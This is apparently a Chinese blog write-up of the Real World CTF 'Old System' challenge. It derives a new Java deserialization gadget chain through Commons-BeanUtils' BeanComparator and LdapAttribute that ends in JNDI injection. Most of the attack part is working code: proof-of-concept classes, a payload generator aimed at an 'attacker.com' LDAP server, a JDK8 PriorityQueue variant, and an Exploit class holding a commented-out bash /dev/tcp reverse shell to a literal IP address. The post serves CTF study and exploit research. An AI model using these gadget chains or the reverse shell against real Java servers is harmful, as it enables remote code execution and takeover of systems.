---
layout: post
title: 基于rw2021 oldSystem题目的新jndi链子
categories: [blog ]
tags: [Java,]
description: "重生之我是java🐕"
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: azeril.com
---

# Real World CTF 3rd Writeup | Old System

### 前言

```java
好久没做java题了，赶紧来来感觉
这次打算复现的是一个rw题目，不知道自己能不能行，但是尽力
    题目描述：
    How to exploit the deserialization vulnerability in such an ancient Java environment ?
    Java version: 1.4.2_19
```

### 首先自己分析一下

代码不多，有用了就二个java类，看着名字就不简单的样子

![image-20231009194336472](..\img\final\image-20231009194336472.png)

lib里面也就只有四个第三方库

![image-20231009194601453](..\img\final\image-20231009194601453.png)

通过web.xml可以发现这个是通过tomcat的java web项目构建的



```java
public class ClassLoaderObjectInputStream extends ObjectInputStream {
    private final ClassLoader classLoader;

    public ClassLoaderObjectInputStream(ClassLoader classLoader, InputStream inputStream) throws IOException, StreamCorruptedException {
        super(inputStream);
        this.classLoader = classLoader;
    }

    @Override // java.io.ObjectInputStream
    protected Class resolveClass(ObjectStreamClass objectStreamClass) throws IOException, ClassNotFoundException {
        return Class.forName(objectStreamClass.getName(), false, this.classLoader);
        //改为了false，不会触发static了
    }

    @Override // java.io.ObjectInputStream
    protected Class resolveProxyClass(String[] strArr) throws IOException, ClassNotFoundException {
        Class[] clsArr = new Class[strArr.length];
        for (int i = 0; i < strArr.length; i++) {
            clsArr[i] = Class.forName(strArr[i], false, this.classLoader);//反射获得类名属性
        }
        return Proxy.getProxyClass(this.classLoader, clsArr);
    }
}
```

`ObjectServlet.class`

```java
package org.rwctf;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/* loaded from: ROOT.war:WEB-INF/classes/org/rwctf/ObjectServlet.class */
public class ObjectServlet extends HttpServlet {
    private ClassLoader appClassLoader;

    public void init(ServletConfig servletConfig) throws ServletException {
        File[] listFiles;//定义了一个Files数组
        ObjectServlet.super.init(servletConfig);
        String realPath = servletConfig.getServletContext().getRealPath("/");
        File file = new File(new StringBuffer().append(realPath).append(File.separator).append("WEB-INF").append(File.separator).append(File.separator).append("lib").toString());
        
        if (file.exists() && file.isDirectory() && (listFiles = file.listFiles()) != null) {
            URL[] urlArr = new URL[listFiles.length + 1];
            for (int i = 0; i < listFiles.length; i++) {
                if (listFiles[i].getName().endsWith(".jar")) {
                    try {
                        urlArr[i] = listFiles[i].toURI().toURL();
                    } catch (MalformedURLException e) {
                        e.printStackTrace();
                    }
                }
            }
            File file2 = new File(new StringBuffer().append(realPath).append(File.separator).append("WEB-INF").append(File.separator).append(File.separator).append("classes").toString());
            if (file2.exists() && file2.isDirectory()) {
                try {
                    urlArr[urlArr.length - 1] = file2.toURI().toURL();
                } catch (MalformedURLException e2) {
                    e2.printStackTrace();
                }
            }
            this.appClassLoader = new URLClassLoader(urlArr);
        }
    }

    protected void doPost(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws ServletException, IOException {
        PrintWriter writer = httpServletResponse.getWriter();
        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();//得到上下文类加载器
        Thread.currentThread().setContextClassLoader(this.appClassLoader);//设置应用类加载器
        try {
            try {
                ClassLoaderObjectInputStream classLoaderObjectInputStream = new ClassLoaderObjectInputStream(this.appClassLoader, httpServletRequest.getInputStream());
                
                Object readObject = classLoaderObjectInputStream.readObject();
                //这里是一个反序列化
                classLoaderObjectInputStream.close();
                writer.print(readObject);
                Thread.currentThread().setContextClassLoader(contextClassLoader);
            } catch (ClassNotFoundException e) {
                e.printStackTrace(writer);
                Thread.currentThread().setContextClassLoader(contextClassLoader);
            }
        } catch (Throwable th) {
            Thread.currentThread().setContextClassLoader(contextClassLoader);
            throw th;
        }
    }
}
```

```
卧槽看了和没看没啥区别，果真就看不懂，初始化也是。
```

这里给出了CC的版本

```
commons-beanutils 依赖版本是 1.6
commons-collections:2.1
```

![image-20231009200752496](..\img\final\image-20231009200752496.png)

大体的可以看出就是根据，CC和CB的结合，在jdk1.4中拼接一条链子

```
导入进来以后发现，CC常用的一些 transformer类都没了，只能看CB了
```

![image-20231009203446824](..\img\final\image-20231009203446824.png)

想看PriorityQueue类有没有（网上下载了jdk1.4但是版本不兼容）所以不知道有没有这个PriorityQueue

![image-20231009203841165](..\img\final\image-20231009203841165.png)

这里就看见了（看CB依赖看的，compare很重要的 毕竟比较就会调用——

![image-20231009204909703](..\img\final\image-20231009204909703.png)

`这里通过比对发下吗（jdk1.4里面是 compare）jdk1.7就是compareTo，并且没有PriorityQueue类`

![image-20231009211156248](..\img\final\image-20231009211156248.png)

所以我们需要找谁调用了TreeMap的get方法（这是目前唯一的思路）

可以重点关注那些 Hashmap、hashset、hashtable

(本来想的是hashmap反序列化，触发equals方法，然后equals。。只能到这了)

```java
TreeMap#get
   TreeMap#getEntry 
      BeanComparator#compare
```

看解析说是（以下均为jdk 1.4版本的内容）：

AbstractMap.class

```java
 public boolean equals(Object o) {
	if (o == this)
	    return true;

	if (!(o instanceof Map))//o必须是Map类型
	    return false;
	Map t = (Map) o;
	if (t.size() != size())
	    return false;

        try {
            Iterator i = entrySet().iterator();
            while (i.hasNext()) {
                Entry e = (Entry) i.next();
                Object key = e.getKey();
                Object value = e.getValue();
                if (value == null) {
                    if (!(t.get(key)==null && t.containsKey(key))) //
                        return false;
                } else {
                    if (!value.equals(t.get(key)))  //这里会调用get
                        //就直接  值.equals(我们传的map.get(key))   比如 map.put(a,b)  b.equals(map.get(a))
                         //完美适应了调用 TreeMap.get（）
                        return false;
                }
            }
        } catch(ClassCastException unused)   {
            return false;
        } catch(NullPointerException unused) {
            return false;
        }

	return true;
    }
```

接下来就是找谁调用了equals方法这就简单了，直接看HashMap

HashMap.java

(可以看到低版本和高版本完全不一样，这里只有一个putForCreate方法)

```java
private void readObject(java.io.ObjectInputStream s)
            throws IOException, ClassNotFoundException
    {
        // Read in the threshold, loadfactor, and any hidden stuff
        s.defaultReadObject();

        // Read in number of buckets and allocate the bucket array;
        int numBuckets = s.readInt();
        table = new Entry[numBuckets];

        init();  // Give subclass a chance to do its thing.

        // Read in size (number of Mappings)
        int size = s.readInt();

        // Read the keys and values, and put the mappings in the HashMap
        for (int i=0; i<size; i++) {
            Object key = s.readObject();
            Object value = s.readObject();
            putForCreate(key, value);  //这里调用下面  key和value可控
        }
    }
```

```java
private void putForCreate(Object key, Object value) {
        Object k = maskNull(key);//还是本来的key
        int hash = hash(k);//key的hash
        int i = indexFor(hash, table.length);

        /**
         * Look for preexisting entry for key.  This will never happen for
         * clone or deserialize.  It will only happen for construction if the
         * input Map is a sorted map whose ordering is inconsistent w/ equals.
         */
        for (Entry e = table[i]; e != null; e = e.next) {
            if (e.hash == hash && eq(k, e.key)) {//套路还是相同一个hash相同  这里调用的是 二次的key
                e.value = value;
                return;
            }
        }

        createEntry(hash, k, value, i);
    }

 static Object maskNull(Object key) {
        return (key == null ? NULL_KEY : key);
    }
   static int indexFor(int h, int length) {
        return h & (length-1);
    }

```

```java
static boolean eq(Object x, Object y) {
        return x == y || x.equals(y);//我们需要调用的是 AbstractMap#equals  y需要是TreeMap对象
                                     //t.get(key)  对象.key
    }
```

![image-20231009215632214](..\img\final\image-20231009215632214.png)

![image-20231009215716172](..\img\final\image-20231009215716172.png)

![image-20231009215753857](..\img\final\image-20231009215753857.png)

### `总结以下目前的调用链子`

```java
HashMap#readObject 
     HashMap#putForCreate
          HashMap#eq
             AbstractMap#equals
                 TreeMap#get
                     TreeMap#getEntry 
                          BeanComparator#compare   ->getter方法
```

绕hash(对key进行的hash)

```java
tree1=new TreeMap(,)
tree2=new TreeMap(,)
map=new HashMap()
map.put(tree1,);
map.put(tree2,);


TreeMap treeMap1 = new TreeMap(comparator);
treeMap1.put(payloadObject, "aaa");
TreeMap treeMap2 = new TreeMap(comparator);
treeMap2.put(payloadObject, "aaa");
HashMap hashMap = new HashMap();
hashMap.put(treeMap1, "bbb");
hashMap.put(treeMap2, "ccc");
```

接下来就是如何rce了，从（ProperUtils在CB依赖中没影响）

![image-20231009221032080](..\img\final\image-20231009221032080.png)



### 下面的jndi链接不仅使用于 jdk1.4还试用于jdk1.8

前提是:

```java
而目前已经公开的利用类 TemplatesImpl 和 JdbcRowSetImpl 在 Java 1.4 的版本里都是没有的，所以如果要解决这个问题的话，没有捷径可走，只能够挖掘新的链。
```

从上面调用到的Beancompare--->可以到PropertyUtils中的一个invoke方法，可以看到获取类中的get方法反射调用，这里是无参调用

1. 实现了Serializable接口
2. 其某个getter方法里进行了敏感危险操作，而且是public修饰的getter方法（不能有参数 ）

![image-20231010144712491](..\img\final\image-20231010144712491.png)



```
com.sun.jndi.ldap.LdapAttribute
```

特别想用codeql语法来进行一个查询（但是构建数据库太麻烦了最后尝试尝试）

codeql查询语句（如何查一个getter方法呢，方法名没有固定的值）

怎么表达没有参数呃呃呃

```java
import java
from Method method
where method.hasName("")
select method,method.getDeclartype
```



这是一个只有包权限的（final不能被继承的类）

```java
这里用的是
com.sun.jndi.ldap.LdapAttribute这个类
final class LdapAttribute extends BasicAttribute {
 public DirContext getAttributeDefinition() throws NamingException {
        DirContext var1 = this.getBaseCtx().getSchema(this.rdn);
        return (DirContext)var1.lookup("AttributeDefinition/" + this.getID());
    }
    InitialContext#lookup
```

调用了lookup那么如果var1是InitialContext.java类型，就可以触发jndi注入了

（`所以我们需要根以下看它是什么类型的，然后因为是包权限需要用反射来调用方法_)`

`但是这个context类型是（InitialDirContext类型的 ）`

![image-20231010153247755](..\img\final\image-20231010153247755.png)

纠正一下上面的错误，

![image-20231010194512605](..\img\final\image-20231010194512605.png)

首先我们进入getBaseCtx()类型看一下

```java
其实大概的就是
定义了一个hashtable然后put赋值，需要注意的是这里的baseCtxURL是我们的ldap，InitialDirContext是一个初始化的操作
```

![image-20231010194723534](..\img\final\image-20231010194723534.png)

可是这个类的lookup会调用到HiermemDirCtx的lookup上，并且这个HiermemDirCtx和InitialContext没一点关系

![image-20231010195858994](..\img\final\image-20231010195858994.png)

![image-20231010195908256](..\img\final\image-20231010195908256.png)

但是看一下jndi的lookup调用,说明调用哪一个lookup都可以

```java
javax.naming.InitialContext#lookup(java.lang.String)
-> com.sun.jndi.url.ldap.ldapURLContext#lookup(java.lang.String)
-> com.sun.jndi.toolkit.url.GenericURLContext#lookup(java.lang.String)
-> com.sun.jndi.toolkit.ctx.PartialCompositeContext#lookup(javax.naming.Name)
-> com.sun.jndi.toolkit.ctx.ComponentContext#p_lookup
-> com.sun.jndi.ldap.LdapCtx#c_lookup
-> ......
```

直接看的payload（太难了，真找不到。。）

```java

com.sun.jndi.ldap.LdapAttribute#getAttributeDefinition
-> javax.naming.directory.InitialDirContext#getSchema(javax.naming.Name)
-> com.sun.jndi.toolkit.ctx.PartialCompositeDirContext#getSchema(javax.naming.Name)
-> com.sun.jndi.toolkit.ctx.ComponentDirContext#p_getSchema
-> com.sun.jndi.toolkit.ctx.ComponentContext#p_resolveIntermediate
-> com.sun.jndi.toolkit.ctx.AtomicContext#c_resolveIntermediate_nns
-> com.sun.jndi.toolkit.ctx.ComponentContext#c_resolveIntermediate_nns
-> com.sun.jndi.ldap.LdapCtx#c_lookup
-> ......
```

把断点下在 LdapCtx#

```java
import javax.naming.CompositeName;
import javax.naming.InitialContext;
import javax.naming.InvalidNameException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class poc {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, InvalidNameException {


            String ldapCtxUrl = "ldap://127.0.0.1:9999";

            Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
            Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
                    new Class[] {String.class});
            ldapAttributeClazzConstructor.setAccessible(true);
            Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
                    new Object[] {"name"});

            Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
            baseCtxUrlField.setAccessible(true);
            baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);

            Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
            rdnField.setAccessible(true);
            rdnField.set(ldapAttribute, new CompositeName("a/b"));

            Method getAttributeDefinitionMethod = ldapAttributeClazz.getMethod("getAttributeDefinition");
            getAttributeDefinitionMethod.setAccessible(true);
            getAttributeDefinitionMethod.invoke(ldapAttribute);
    }
}
payload非常的简单只不过
 rdnField.set(ldapAttribute, new CompositeName("a/b"));  这个不太理解。为啥只有 a 后面有个/这个才可以
```

调试了半天也没找到缘由，只有 a/b才为2，别的普通字符串都是1作为了一个整体

![image-20231010211217469](..\img\final\image-20231010211217469.png)

![image-20231010210425878](..\img\final\image-20231010210425878.png)

我们发现只有这个为size 2才有 tail的值，分为了head和tail，毕竟我们需要的函数在满足if条件里面

![image-20231010211324947](..\img\final\image-20231010211324947.png)

```
var7 = this.c_resolveIntermediate_nns(var6, var2);
a\b\b就会成为 a \b\b
```



### `首先试了能否打通（如果打不通那就徒劳白费了）`：

```java
import javax.naming.CompositeName;
import javax.naming.InvalidNameException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class poc {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, InvalidNameException {


            String ldapCtxUrl = "ldap://127.0.0.1:9999";

            Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
            Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
                    new Class[] {String.class});
            ldapAttributeClazzConstructor.setAccessible(true);
            Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
                    new Object[] {"name"});

            Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
            baseCtxUrlField.setAccessible(true);
            baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);

            Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
            rdnField.setAccessible(true);
            rdnField.set(ldapAttribute, new CompositeName("a//b"));

            Method getAttributeDefinitionMethod = ldapAttributeClazz.getMethod("getAttributeDefinition", new Class[] {});
            getAttributeDefinitionMethod.setAccessible(true);
            getAttributeDefinitionMethod.invoke(ldapAttribute, new Object[] {});
    }
}
```

![image-20231010183740300](..\img\final\image-20231010183740300.png)

最后写一下利用链子：

```java

java.io.ObjectInputStream#readObject
-> java.util.HashMap#readObject  
-> java.util.HashMap#putForCreate
-> java.util.HashMap#eq
-> java.util.AbstractMap#equals
-> java.util.TreeMap#get
-> java.util.TreeMap#getEntry
-> java.util.TreeMap#compare
    
    （下面都是通用的）
-> org.apache.commons.beanutils.BeanComparator#compare
-> org.apache.commons.beanutils.PropertyUtils#getProperty
-> org.apache.commons.beanutils.PropertyUtils#getNestedProperty
-> org.apache.commons.beanutils.PropertyUtils#getSimpleProperty
-> java.lang.reflect.Method#invoke
-> com.sun.jndi.ldap.LdapAttribute#getAttributeDefinition
-> javax.naming.directory.InitialDirContext#getSchema(javax.naming.Name)
-> com.sun.jndi.toolkit.ctx.PartialCompositeDirContext#getSchema(javax.naming.Name)
-> com.sun.jndi.toolkit.ctx.ComponentDirContext#p_getSchema
-> com.sun.jndi.toolkit.ctx.ComponentContext#p_resolveIntermediate
-> com.sun.jndi.toolkit.ctx.AtomicContext#c_resolveIntermediate_nns
-> com.sun.jndi.toolkit.ctx.ComponentContext#c_resolveIntermediate_nns
-> com.sun.jndi.ldap.LdapCtx#c_lookup
-> JNDI Injection RCE
```

下面都是通用的低版本中的TreeMap是compare，但是jdk8就是compareto了

#### `如果拿jdk8版本打,把上面的替换成下面这个按理说也是可以打通的`

（直接jdk8+CB 依赖）有空了就补上

![image-20231010212146662](..\img\final\image-20231010212146662.png)





### 这是这道题jdk 1.4的payload：

```java

import org.apache.commons.beanutils.BeanComparator;
import javax.naming.CompositeName;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.TreeMap;
public class PayloadGenerator {
public static void main(String[] args) throws Exception {
        String ldapCtxUrl = "ldap://attacker.com:1389";
        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
new Class[] {String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
new Object[] {"name"});
        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
        baseCtxUrlField.setAccessible(true);
        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);
        Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
        rdnField.setAccessible(true);
        rdnField.set(ldapAttribute, new CompositeName("a//b"));
// Generate payload
        BeanComparator comparator = new BeanComparator("class");
        TreeMap treeMap1 = new TreeMap(comparator);
        treeMap1.put(ldapAttribute, "aaa");
        TreeMap treeMap2 = new TreeMap(comparator);
        treeMap2.put(ldapAttribute, "aaa");
        HashMap hashMap = new HashMap();
        hashMap.put(treeMap1, "bbb");
        hashMap.put(treeMap2, "ccc");
        Field propertyField = BeanComparator.class.getDeclaredField("property");
        propertyField.setAccessible(true);
        propertyField.set(comparator, "attributeDefinition");
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("object.ser"));
        oos.writeObject(hashMap);
        oos.close();
    }
}
```





参考链接：

[Real World CTF 3rd Writeup | Old System (qq.com)](https://mp.weixin.qq.com/s/hXoUs4ZJgLHHaTvoyhwFxg)

https://y4er.com/posts/real-wolrd-ctf-old-system-new-getter-jndi-gadget/

## CB链无依赖CC链(适用于jdk8版本)

```java
package CB;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import javax.naming.CompositeName;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;
public class cb1cb {
    public static void setFieldValue(Object obj, String fieldName, Object
            value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        String ldapCtxUrl = "ldap://127.0.0.1:9999/";

        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
                new Class[] {String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
                new Object[] {"name"});

        Field baseCtxUrlField = ldapAttributeClazz.getDeclaredField("baseCtxURL");
        baseCtxUrlField.setAccessible(true);
        baseCtxUrlField.set(ldapAttribute, ldapCtxUrl);

        Field rdnField = ldapAttributeClazz.getDeclaredField("rdn");
        rdnField.setAccessible(true);
        rdnField.set(ldapAttribute, new CompositeName("a//b"));


        final BeanComparator comparator = new BeanComparator("attributeDefinition",
                String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,
                comparator);
// stub data for replacement later
        setFieldValue(queue, "queue", new Object[]{ldapAttribute, ldapAttribute});
        setFieldValue(queue,"size",2);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new
                ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

![image-20231012191922073](..\img\final\image-20231012191922073.png)

放一下Exploit的代码

```java
public class Exploit {
   public Exploit(){
       try{
           // 要执行的命令
           //String[] commands = {"bash","-c","exec 5<>/dev/tcp/101.42.224.57/12345;cat <&5 | while read line; do $line 2>&5 >&5; done"};
           String[] commands={"calc"};
           Process pc = Runtime.getRuntime().exec(commands);
           pc.waitFor();
      } catch(Exception e){
           e.printStackTrace();
      }
  }

   public static void main(String[] argv) {
       Exploit e = new Exploit();
  }
}

```

调用链子

```java
jdk.PriorityQueue#readObject
     PriorityQueue#heapify
           PriorityQueue#siftDown
                priorityQueue#siftDownUsingComparator
    
                    CB.  BeanComparator#compare
                          cb      PropertyUtils#getproperty
                                     PropertyUtils#getNestedProperty
                                            PropertyUtils#getSimpleProperty
                                              com.sun.jndi.ldap.LdapAttribute#getAttributeDefinition
```

#### 总结

```java
那如果是这样的话，fastjson、jackson触发getter方法应该也能打，以后碰上在搞！！！
```

